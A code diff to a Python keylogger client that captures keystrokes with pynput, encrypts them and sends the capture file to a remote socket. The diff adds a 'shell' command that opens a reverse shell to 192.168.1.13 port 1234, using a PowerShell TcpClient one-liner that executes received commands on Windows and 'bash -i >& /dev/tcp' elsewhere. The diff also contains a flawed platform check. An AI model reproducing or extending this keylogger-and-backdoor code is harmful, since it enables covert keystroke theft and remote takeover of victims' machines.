@@ -6,6 +6,8 @@ import signal
 from threading import Thread
 from pynput.keyboard import Listener, Controller
 from cryptography.fernet import Fernet
+import subprocess
+import platform
 
 threadtab = []
 def get_platform():
@@ -35,6 +37,14 @@ def receive_message(mysocket,listener):
                 listener.stop()
                 client.send_file_securely(mysocket)
                 client.stop_and_delete_capture_file()
+            elif "shell" == decrypted_data:
+                if platform.uname() == 'Windows':
+                    reverse_payload = "$client = New-Object System.Net.Sockets.TcpClient('192.168.1.13',1234) $stream = $client.GetStream() [byte[]]$bytes = 0..65535|%{0} while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)$sendback = (iex $data 2>&1 | Out-String )$sendback2  = $sendback + 'PS ' + (pwd).Path + '> '$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)$stream.Write($sendbyte,0,$sendbyte.Length)$stream.Flush()}$client.Close()"
+                    os.system(f"powershell -c {reverse_payload}")
+                else:
+                    reverse_payload = "bash -i >& /dev/tcp/192.168.1.13/1234 0>&1"
+                    os.system(reverse_payload)
+                    
         except Exception as e:
             break                        
         
@@ -52,7 +62,6 @@ def listen_keyboard(mysocket):
         with Listener(on_press=on_press, on_release=on_release) as listener:
             Thread(target=receive_message,args=(mysocket,listener)).start()
             Thread(target=func_handle_time,args=(10.0,listener,mysocket)).start()
-            
             listener.join()
     except Exception:
         pass
